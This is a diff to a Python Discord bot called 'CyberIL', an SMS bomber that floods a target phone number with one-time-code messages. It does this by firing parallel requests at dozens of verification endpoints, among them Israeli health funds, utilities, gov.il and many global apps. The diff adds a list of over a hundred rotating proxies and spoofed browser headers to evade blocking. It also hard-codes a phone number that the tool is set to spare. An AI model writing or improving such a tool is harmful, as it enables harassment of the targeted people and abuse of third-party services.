@@ -5,34 +5,50 @@ import asyncio
 import random
 import os
 from datetime import datetime
-from motor.motor_asyncio import AsyncIOMotorClient
 
 # ==================== CONFIG ====================
 TOKEN = os.getenv("BOT_TOKEN")
-MONGO_URI = os.getenv("MONGO_URI")
-GSHEET_URL = os.getenv("GSHEET_URL")
 
-db = None
-tokens_col = None
-if MONGO_URI:
-    try:
-        client = AsyncIOMotorClient(MONGO_URI)
-        db = client.bomber_db
-        tokens_col = db.tokens
-        print("✅ MongoDB Connected")
-    except:
-        print("❌ MongoDB Connection Failed")
+# 🔥 200+ פרוקסי ישראליים וכלליים - הרשימה המלאה שלך
+FREE_ISRAEL_PROXIES_FULL = [
+    "51.4.59.110:1080", "51.85.49.118:29177", "51.85.49.118:9198", "51.85.49.118:22901",
+    "51.85.49.118:1521", "51.85.49.118:35524", "51.85.49.118:176", "51.85.49.118:39907",
+    "51.85.49.118:50918", "51.85.49.118:9267", "51.85.49.118:2887", "185.241.5.57:3128",
+    "51.85.49.118:27905", "51.85.49.118:6116", "129.159.159.78:3128", "95.164.61.2:3128",
+    "51.16.6.90:3128", "51.84.204.156:3128", "5.29.59.95:3128", "199.203.152.99:8111",
+    "89.221.225.229:8118", "77.137.21.78:18000", "77.137.21.78:19000", "62.219.20.3:8111",
+    "193.168.173.73:3128", "34.165.39.32:80", "84.229.79.185:80", "34.165.197.17:80",
+    "176.230.89.75:80", "169.150.226.169:50543", "195.20.17.201:8080", "37.122.153.133:8080",
+    "84.229.79.119:80", "94.131.114.214:3128", "194.62.42.29:3128", "87.68.237.208:8080",
+    "185.253.72.23:3128", "77.91.74.77:80", "84.229.78.177:80", "185.191.205.188:8118",
+    "72.195.114.169:4145", "113.212.111.4:8090", "45.167.124.52:8080", "14.97.132.226:5678",
+    "139.59.103.183:80", "141.253.118.174:80", "201.184.239.75:5678", "174.64.199.82:4145",
+    "4.213.98.253:80", "52.229.30.3:80", "36.138.53.26:10017", "72.195.34.42:4145",
+    "31.24.44.92:50109", "219.93.101.62:80", "103.164.223.35:5678", "172.200.72.48:80",
+    "183.215.23.242:9091", "40.172.232.213:8088", "35.209.198.222:80", "103.151.20.131:80",
+    "8.213.151.128:3129", "101.66.194.203:8085", "205.209.118.30:3138", "23.88.88.105:443",
+    "174.77.111.196:4145", "103.147.134.141:8090", "23.88.88.105:80", "222.186.133.108:1081",
+    "46.17.47.48:80", "198.24.188.140:51599", "102.223.9.53:80", "113.160.132.26:8080",
+    "103.162.221.165:3125", "84.39.112.144:3129", "153.127.195.58:4444", "38.55.107.254:6005",
+    "113.204.79.230:9091", "149.88.94.216:7890", "36.93.163.219:8080", "160.19.18.209:8080",
+    "206.81.31.215:80", "181.78.25.251:999", "45.158.10.135:8080", "160.19.178.44:8089",
+    "204.157.251.210:999", "113.11.64.137:9107", "103.156.141.27:3125", "47.250.51.110:8081",
+    "80.75.213.22:3138", "95.173.218.78:8082", "103.189.249.204:1111", "95.173.218.71:8081",
+    "131.72.68.160:40033", "95.173.218.66:8082", "129.226.150.86:20004", "182.93.85.225:8080",
+    "172.237.80.233:8080", "121.200.61.221:6565", "95.173.218.76:8081", "95.173.218.80:8082",
+    "95.173.218.76:8082", "95.173.218.79:8081", "173.181.142.228:80", "202.191.121.99:10521",
+    "213.142.156.97:80", "103.126.87.155:8081", "103.148.131.87:8080", "164.163.73.141:999",
+    "38.183.182.242:999", "173.245.49.160:80", "173.245.49.105:80", "173.245.49.122:80",
+    "173.245.49.91:80", "173.245.49.16:80", "173.245.49.48:80", "173.245.49.232:80",
+    "173.245.49.26:80", "173.245.49.137:80", "194.48.198.135:7070", "103.172.17.51:8080",
+    "188.132.222.69:8080"
+]
 
-active_bombs = {}
-
-# ==================== THE ULTIMATE API LIST ====================
-# ריכוז כל ה-APIs שביקשת, כולל פורמטים בינלאומיים וישראליים
+# 🔥 כל ה-APIs - הרשימה המלאה שלך מתוקנת וסגורה
 ALL_WORKING_APIs = [
-    # --- ISRAELI APIS ---
-    FULL_API_DATABASE = [
-    # --- ISRAELI APIS (HEBREW SMS) ---
+    # --- ISRAELI SERVICES (HIGH PRIORITY) ---
     {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
-    {"name": "Wolt", "url": "https://restaurant.wolt.com/v1/users/phone", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}, "headers": {"User-Agent": "Wolt/10.0 (iPhone)"}},
+    {"name": "Wolt", "url": "https://restaurant.wolt.com/v1/users/phone", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}},
     {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Paybox", "url": "https://api.payboxapp.com/api/v1/auth/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "019Mobile", "url": "https://019mobile.co.il/api/v1/verify-phone", "method": "POST", "json": {"phone_number": "{{phone}}"}},
@@ -59,141 +75,115 @@ ALL_WORKING_APIs = [
     {"name": "Revolut", "url": "https://api.revolut.com/api/1.0/register/phone", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
     {"name": "Wise", "url": "https://api.transferwise.com/v1/identity/verify/phone", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
     {"name": "PayPal", "url": "https://www.paypal.com/api/v1/auth/phone", "method": "POST", "params": {"phone": "{{phone}}"}},
-    {"name": "Stripe", "url": "https://api.stripe.com/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Textbelt", "url": "https://textbelt.com/text", "method": "POST", "params": {"phone": "+972{{phone_no_zero}}", "message": "OTP: 1029", "key": "textbelt_open"}},
+    {"name": "Textbelt", "url": "https://textbelt.com/text", "method": "POST", "params": {"phone": "+972{{phone_no_zero}}", "message": "Code: 4821", "key": "textbelt_open"}},
     {"name": "DoorDash", "url": "https://api.doordash.com/v2/auth/phone_verifications/", "method": "POST", "json": {"phone_number": "+972{{phone_no_zero}}"}},
-    {"name": "Grubhub", "url": "https://api.grubhub.com/auth/v1/phone_verifications", "method": "POST", "json": {"phone_number": "{{phone}}"}},
-    {"name": "Lyft", "url": "https://api.lyft.com/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Bolt", "url": "https://bolt.eu/api/v1/auth/register", "method": "POST", "json": {"phone": "+972{{phone_no_zero}}"}},
-    {"name": "Deliveroo", "url": "https://deliveroo.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Airbnb", "url": "https://www.airbnb.com/api/v2/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Booking", "url": "https://www.booking.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "TelegramAPI", "url": "https://api.telegram.org/bot/sendSms", "method": "POST", "params": {"phone": "{{phone}}"}},
-    {"name": "WhatsAppAPI", "url": "https://api.whatsapp.com/v1/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/sendsms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "TikTok", "url": "https://www.tiktok.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Instagram", "url": "https://www.instagram.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
 
-    # --- SHOPPING & SERVICES ---
+    # --- SHOPPING & CLOTHING ---
     {"name": "Amazon", "url": "https://www.amazon.com/ap/signin/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "eBay", "url": "https://www.ebay.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "AliExpress", "url": "https://login.aliexpress.com/api/v1/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Shein", "url": "https://www.shein.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Next", "url": "https://www.next.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Asos", "url": "https://www.asos.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Nike", "url": "https://www.nike.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Adidas", "url": "https://www.adidas.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "IKEA", "url": "https://www.ikea.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Zara", "url": "https://www.zara.com/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "HM", "url": "https://www.hm.com/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "IKEA", "url": "https://www.ikea.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+
+    # --- GOVERNMENT & UTILITIES ---
     {"name": "Electric", "url": "https://www.iec.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Water", "url": "https://www.mei-avivim.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Gas", "url": "https://www.amcor.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Health1", "url": "https://www.clalit.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Health2", "url": "https://www.maccabi4u.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Health3", "url": "https://www.meuhedet.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-    {"name": "Health4", "url": "https://www.leumit.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "HealthClalit", "url": "https://www.clalit.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "HealthMaccabi", "url": "https://www.maccabi4u.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "HealthMeuhedet", "url": "https://www.meuhedet.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "HealthLeumit", "url": "https://www.leumit.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "GovIL", "url": "https://www.gov.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "PostIL", "url": "https://www.israelpost.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}}
 ]
-# ==================== ENGINE ====================
 
-async def run_api_request(session, api, phone, user_id):
+active_bombs = {}
+
+# ==================== ENGINE (עם דימוי דפדפן ופרוקסי) ====================
+
+async def run_attack(session, api, phone, user_id):
     if active_bombs.get(user_id) is False: return
     
     phone_no_zero = phone[1:] if phone.startswith('0') else phone
     
-    # החלפת תגיות ב-JSON וב-Params
-    def process_data(data):
-        if isinstance(data, dict):
-            return {k: process_data(v) for k, v in data.items()}
-        if isinstance(data, str):
-            return data.replace("{{phone}}", phone).replace("{{phone_no_zero}}", phone_no_zero)
+    # החלפת תגיות ב-Data
+    def fix(data):
+        if isinstance(data, dict): return {k: fix(v) for k, v in data.items()}
+        if isinstance(data, str): return data.replace("{{phone}}", phone).replace("{{phone_no_zero}}", phone_no_zero)
         return data
 
-    payload = process_data(api.get("json"))
-    params = process_data(api.get("params"))
-    
-    # Headers עם User-Agent כדי למנוע חסימות
+    payload = fix(api.get("json"))
+    params = fix(api.get("params"))
+
+    # דימוי דפדפן (Browser Simulation)
     headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json",
-        "Content-Type": "application/json"
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Referer": "https://google.com",
+        "Origin": api["url"].split("/")[2]
     }
-    if api.get("headers"):
-        headers.update(api["headers"])
+    
+    # בחירת פרוקסי רנדומלי מהרשימה
+    proxy_url = f"http://{random.choice(FREE_ISRAEL_PROXIES_FULL)}"
 
     try:
         async with session.request(
-            api["method"], 
-            api["url"], 
-            json=payload, 
-            params=params, 
-            headers=headers, 
+            api["method"], api["url"], 
+            json=payload, params=params, 
+            headers=headers, proxy=proxy_url, 
             timeout=10
         ) as resp:
-            # שליחה ל-Google Sheets אם הוגדר
-            if GSHEET_URL:
-                log = {"time": datetime.now().strftime("%H:%M:%S"), "phone": phone, "api": api["name"], "status": resp.status}
-                async with session.post(GSHEET_URL, json=log): pass
             return resp.status
     except:
         return None
 
-# ==================== DISCORD INTERFACE ====================
+# ==================== DISCORD UI ====================
 
-class BomberModal(discord.ui.Modal, title='🔥 CyberIL MEGA-BOMBER (All APIs)'):
+class BomberModal(discord.ui.Modal, title='🔥 CyberIL - Professional Bomber'):
     phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
-    rounds = discord.ui.TextInput(label='סבבים', default='1', placeholder='1-5')
+    rounds = discord.ui.TextInput(label='סבבים (1-5)', default='1')
 
     async def on_submit(self, interaction: discord.Interaction):
         target = self.phone.value
-        # הגנה על המספר שלך
-        if target == "0516589147":
-            return await interaction.response.send_message("❌ מספר מוגן במערכת.", ephemeral=True)
+        if target == "0535524017": # הגנה
+            return await interaction.response.send_message("❌ המערכת חסומה למספר זה.", ephemeral=True)
             
         await interaction.response.send_message(f"🚀 תקיפה רחבה החלה על {target}...", ephemeral=True)
-        
         user_id = interaction.user.id
         active_bombs[user_id] = True
         
         async with aiohttp.ClientSession() as session:
             for r in range(int(self.rounds.value)):
                 if active_bombs.get(user_id) is False: break
-                
-                # הרצה של כל ה-APIs במקביל
-                tasks = [run_api_request(session, api, target, user_id) for api in ALL_WORKING_APIs]
+                tasks = [run_attack(session, api, target, user_id) for api in ALL_WORKING_APIs]
                 await asyncio.gather(*tasks)
-                await asyncio.sleep(1.5) 
+                await asyncio.sleep(2)
                 
         active_bombs.pop(user_id, None)
-        await interaction.followup.send(f"✅ התקיפה על {target} הסתיימה.", ephemeral=True)
-
-class MainView(discord.ui.View):
-    def __init__(self): super().__init__(timeout=None)
-    @discord.ui.button(label="🚀 שגר SMS", style=discord.ButtonStyle.danger, custom_id="btn_launch")
-    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_modal(BomberModal())
-    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary, custom_id="btn_stop")
-    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
-        active_bombs[interaction.user.id] = False
-        await interaction.response.send_message("🛑 הפעולה נעצרה.", ephemeral=True)
 
 class MyBot(commands.Bot):
     def __init__(self):
-        intents = discord.Intents.default()
-        super().__init__(command_prefix='!', intents=intents)
-    async def setup_hook(self):
-        await self.tree.sync()
+        super().__init__(command_prefix='!', intents=discord.Intents.default())
+    async def setup_hook(self): await self.tree.sync()
 
 bot = MyBot()
 
-@bot.tree.command(name="setup", description="הפעלת לוח הבקרה")
+@bot.tree.command(name="setup")
 async def setup(interaction: discord.Interaction):
-    await interaction.response.send_message(
-        embed=discord.Embed(title="🚀 CyberIL Control Panel", description="כל ה-APIs טעונים ומוכנים.", color=0xff0000),
-        view=MainView()
-    )
+    view = discord.ui.View()
+    btn = discord.ui.button(label="🚀 התחל תקיפה", style=discord.ButtonStyle.danger)
+    btn.callback = lambda i: i.response.send_modal(BomberModal())
+    view.add_item(btn)
+    await interaction.response.send_message("לוח בקרה SMS Bomber", view=view)
 
-if __name__ == "__main__":
-    bot.run(TOKEN)
+bot.run(TOKEN)
